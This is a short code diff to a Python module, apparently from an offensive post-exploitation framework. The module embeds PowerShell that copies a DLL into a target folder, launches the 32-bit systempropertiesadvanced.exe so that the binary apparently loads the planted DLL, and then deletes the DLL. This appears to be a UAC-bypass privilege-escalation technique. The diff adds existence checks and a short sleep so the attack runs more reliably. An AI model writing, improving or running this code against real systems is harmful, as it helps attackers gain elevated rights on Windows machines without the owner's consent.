@@ -38,13 +38,20 @@ class CustomModule(Module):
                 mkdir $path
             }
 
-            Copy-Item $dll $dest
+            if (-not (Test-Path $dll)){
+                return
+            }
 
-            #Run Process
-            Start-Process C:\\windows\\syswow64\\systempropertiesadvanced.exe
-            
-            #Remove DLL
-            rm $dest
+           if (Test-Path $dll){
+                Copy-Item $dll $dest
+
+                #Run Process
+                Start-Process C:\windows\syswow64\systempropertiesadvanced.exe
+                Start-Sleep 1
+
+                #Remove DLL
+                rm $dest
+            }
         }
         '''
 
